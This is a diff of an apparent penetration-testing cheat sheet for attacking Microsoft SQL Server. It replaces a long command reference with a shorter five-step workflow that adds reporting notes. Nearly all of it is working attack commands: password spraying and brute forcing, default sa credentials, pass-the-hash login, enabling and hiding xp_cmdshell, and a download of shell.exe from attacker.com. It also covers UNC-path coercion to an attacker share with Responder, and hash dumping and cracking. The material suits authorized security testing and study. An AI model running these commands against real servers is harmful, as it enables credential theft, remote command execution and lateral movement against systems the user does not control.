@@ -1,403 +1,143 @@
-# MSSQL / Microsoft SQL Server — TCP/1433
+# MSSQL
+
+## Why It Matters
+
+MSSQL can provide:
+
+- application data access
+- password and hash exposure
+- linked-server pivoting
+- Windows-integrated credential validation
+- operating system command execution in high-impact cases
+
+## Workflow
+
+1. detect the service and instance details
+2. validate credentials
+3. enumerate databases, users, and privileges
+4. identify sysadmin or dangerous extended procedure access
+5. prove data or host impact
 
 ## Detection
 
-### nmap
-```
-nmap -p 1433 -sV <IP>
-nmap -p 1433 --script ms-sql-info <IP>
-nmap -p 1433 --script ms-sql-ntlm-info <IP>
-```
-
-## Banner Grabbing
-
-### netcat
-```
-nc -nv target.com 1433
+```bash
+nmap -p 1433 -sV <ip>
+nmap -p 1433 --script ms-sql-info <ip>
+nmap -p 1433 --script ms-sql-ntlm-info <ip>
+nmap -sU -p 1434 --script ms-sql-discover <ip>
 ```
 
-### nmap
-```
-nmap -p 1433 -sV --script-args mssql.instance-all target.com
-```
+UDP 1434 helps identify instances and browser service data.
 
-## MSSQL Instance Discovery
+## Step 1: Connect
 
-### nmap (SQL Server Browser Service (UDP 1434))
-```
-nmap -sU -p 1434 --script ms-sql-discover target.com
-```
-
-### Metasploit
-```
-use auxiliary/scanner/mssql/mssql_ping
-set RHOSTS target.com
-run
-```
-
-## Authentication Testing
-
-### Credential Validation
-```
-crackmapexec mssql <IP> -u users.txt -p passwords.txt
-```
-
-### Password Spray
-```
-crackmapexec mssql <IP> -u users.txt -p 'Winter2024!'
-```
-
-### Brute Force
-```
-hydra -L users.txt -P passwords.txt <IP> mssql
-```
-
-## Connect
-
-### impacket-mssqlclient.py 
-
-#### Windows authentication
-```
-impacket-mssqlclient DOMAIN/username:password@target.com -windows-auth
-```
-#### SQL authentication
-```
+```bash
+impacket-mssqlclient DOMAIN/user:password@target -windows-auth
 impacket-mssqlclient sa:password@target.com
-```
-#### With specific database
-```
-impacket-mssqlclient username:password@target.com -db master
-```
-#### Using hash (Pass-the-Hash)
-```
 impacket-mssqlclient username@target.com -hashes :NTHASH
-```
-
-### sqsh
-#### Connect with SQL authentication
-```
 sqsh -S target.com -U sa -P password
 ```
-#### Connect with Windows authentication
-```
-sqsh -S target.com -U DOMAIN\\username -P password
+
+## Step 2: Validate And Spray
+
+```bash
+crackmapexec mssql <ip> -u users.txt -p passwords.txt
+crackmapexec mssql <ip> -u users.txt -p 'Winter2024!'
+hydra -L users.txt -P passwords.txt <ip> mssql
 ```
 
-## In-Database Enumeration
+Prefer reused credentials or hashes first.
 
-### Version Detection
-#### Get SQL Server version
-```
+## Step 3: Enumeration
+
+Useful orientation queries:
+
+```sql
 SELECT @@version;
-```
-
-#### Get Product version
-```
 SELECT SERVERPROPERTY('ProductVersion');
-SELECT SERVERPROPERTY('ProductLevel');
-SELECT SERVERPROPERTY('Edition');
-```
-
-#### Get Machine name
-```
-SELECT @@SERVERNAME;
-SELECT SERVERPROPERTY('MachineName');
-```
-
-
-### List databases
-```
-SELECT name FROM sys.databases;
-SELECT name FROM master.dbo.sysdatabases;
-```
-
-### Current Database
-```
 SELECT DB_NAME();
-```
-
-### Database Information
-```
-SELECT name, database_id, create_date 
-FROM sys.databases;
-```
-
-### Switch database
-```
-USE master;
-```
-
-### User Enumeration
-
-#### List All Users
-```
-SELECT name FROM master.sys.server_principals;
-SELECT name FROM sys.sysusers;
-```
-
-#### Current User
-```
-SELECT USER_NAME();
 SELECT SYSTEM_USER;
-SELECT CURRENT_USER;
-```
-
-#### User Privileges
-```
-SELECT * FROM fn_my_permissions(NULL, 'SERVER');
-```
-
-#### List Sysadmin Users
-```
-SELECT name FROM master.sys.server_principals 
-WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
-```
-
-### Table And Column Enumeration
-
-#### List tables in current database
-```
+SELECT USER_NAME();
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT name FROM sys.databases;
 SELECT table_name FROM information_schema.tables;
 ```
 
-#### List all columns in a table
-```
-SELECT column_name, data_type 
-FROM information_schema.columns 
-WHERE table_name = 'users';
-```
+Focus on:
 
-#### Search for specific column names
-```
-SELECT table_name, column_name 
-FROM information_schema.columns 
-WHERE column_name LIKE '%password%';
-```
+- current user context
+- whether `sysadmin` is present
+- interesting databases and credential tables
 
-#### Count rows in tables
-```
-SELECT t.name, p.rows 
-FROM sys.tables t
-INNER JOIN sys.partitions p ON t.object_id = p.object_id
-WHERE p.index_id < 2
-```
+## Step 4: Privilege And Pivot Checks
 
-### Privilege Enumeration
+### Users And Roles
 
-#### Identify login context
-```
-SELECT SYSTEM_USER;
-SELECT USER_NAME();
-```
-
-#### Check if current user is sysadmin
-```
-SELECT IS_SRVROLEMEMBER('sysadmin');
-```
-- `1` = sysadmin
-- `0` = not sysadmin
-
-
-#### Check server roles
-```
-SELECT name FROM master.sys.server_principals 
-WHERE type = 'R';
-```
-
-#### Database role members
-```
+```sql
+SELECT name FROM master.sys.server_principals;
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
 EXEC sp_helprolemember;
 ```
 
-### Linked Server Enumeration
-#### List linked servers
-```
+### Linked Servers
+
+```sql
 EXEC sp_linkedservers;
 SELECT * FROM sys.servers;
-```
-#### Test linked server connection
-```
-SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');
-```
-#### Execute on linked server
-```
 EXEC ('SELECT @@version') AT [LinkedServerName];
 ```
 
+Linked servers can turn one foothold into lateral database access.
 
-## Attack Vectors
- 
-### Default Credentials (try with impacket-mssqlclient)
-```
-sa:<blank>
-sa:sa
-sa:password
-sa:Password123
-sa:P@ssw0rd
-```
+## Step 5: High-Impact Abuse
 
-### Brute Force Attack
+### `xp_cmdshell`
 
-#### hydra
-```
-hydra -l sa -P /usr/share/wordlists/rockyou.txt target.com mssql
-```
-
-#### Metasploit
-```
-use auxiliary/scanner/mssql/mssql_login
-set RHOSTS target.com
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
-```
-
-#### nmap
-```
-nmap -p 1433 --script ms-sql-brute \
-  --script-args userdb=users.txt,passdb=passwords.txt target.com
-```
-
-## High-Value Abuse Paths
-### xp_cmdshell (OS Command Execution)
-
-#### Enable xp_cmdshell
-```
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-```
-
-#### Execute Commands
-```
+```sql
 EXEC xp_cmdshell 'whoami';
 EXEC xp_cmdshell 'hostname';
-EXEC xp_cmdshell 'ipconfig';
 ```
 
-#### Disable xp_cmdshell (for stealth)
-```
-EXEC sp_configure 'xp_cmdshell', 0;
-RECONFIGURE;
-```
+If it is disabled but you are effectively `sysadmin`, it may be possible to enable it. That is a high-impact host-level path.
 
-### Reading Files
+### File And Share Interaction
 
-#### xp_cmdshell (read file)
-```
-EXEC xp_cmdshell 'type C:\Windows\win.ini';
-```
-
-#### xp_dirtree (list directories)
-```
+```sql
 EXEC master..xp_dirtree 'C:\', 1, 1;
-```
-
-#### xp_fileexist (check file existence)
-```
 EXEC master..xp_fileexist 'C:\Windows\win.ini';
 ```
 
-#### OPENROWSET
-```
-SELECT * FROM OPENROWSET(
-  BULK 'C:\Windows\System32\drivers\etc\hosts',
-  SINGLE_CLOB
-) AS contents;
-```
+### Hash Capture Via UNC Paths
 
-### Writing Files
-
-### Basic File Writing
-#### Write new file
-
-```
-EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';
-```
-#### Copy file
-```
-EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
-```
-
-#### Download file from web
-```
-EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Temp\shell.exe"';
-```
-
-#### BCP utlitiy to export data
-```
-EXEC master..xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout "C:\users.txt" -c -T';
-```
-
-## Capturing MSSQL Service Hash
-### Setting up Hash Capture
-```
-# Force MSSQL to authenticate to attacker's SMB share
-# Start Responder on attacker machine
-sudo responder -I eth0
-
-# On MSSQL
+```sql
 EXEC xp_dirtree '\\attacker-ip\share';
 EXEC xp_fileexist '\\attacker-ip\share\file';
-
-# Or using xp_subdirs
-EXEC master..xp_subdirs '\\attacker-ip\share';
-```
-### Hash Cracking 
-```
-# Capture NTLMv2 hash with Responder
-# Crack with hashcat
-hashcat -m 5600 hash.txt rockyou.txt
 ```
 
-## Privilege Escalation
+This can force outbound authentication from the SQL Server service account.
 
-### Impersonation Attacks
+## Pitfalls
 
-#### Check for impersonation permissions
-```
-SELECT distinct b.name
-FROM sys.server_permissions a
-INNER JOIN sys.server_principals b
-ON a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = 'IMPERSONATE';
-```
+- assuming database access automatically means `sysadmin`
+- enabling host-level abuse before you understand your privilege level
+- ignoring linked servers and impersonation opportunities
 
-#### Impersonate sysadmin user
-```
-EXECUTE AS LOGIN = 'sa';
-SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');
-```
+## Reporting Notes
 
-#### Execute as different user
-```
-EXECUTE AS USER = 'admin_user';
-```
+Capture:
 
-#### Revert to original context
-```
-REVERT;
-```
+- credential type used
+- database and role context
+- sensitive data exposed
+- whether host-level command execution or outbound auth was possible
+- any linked-server or lateral movement implications
 
-## Post-Exploitation
-### Hash Extraction
-```
-SELECT name,password_hash FROM sys.sql_logins
-SELECT name,password FROM users;
-```
+## Fast Checklist
 
-### Metasploit
-```
-# Using Metasploit
-use auxiliary/scanner/mssql/mssql_hashdump
-set RHOSTS target.com
-set USERNAME sa
-set PASSWORD password
-run
-```
-### Crack MSSQL hashes
-```
-hashcat -m 1731 hashes.txt rockyou.txt
+```text
+1. Detect instance details
+2. Validate credentials or hashes
+3. Enumerate DBs, users, and roles
+4. Check sysadmin, linked servers, and dangerous procedures
+5. Prove data or host impact cleanly
 ```
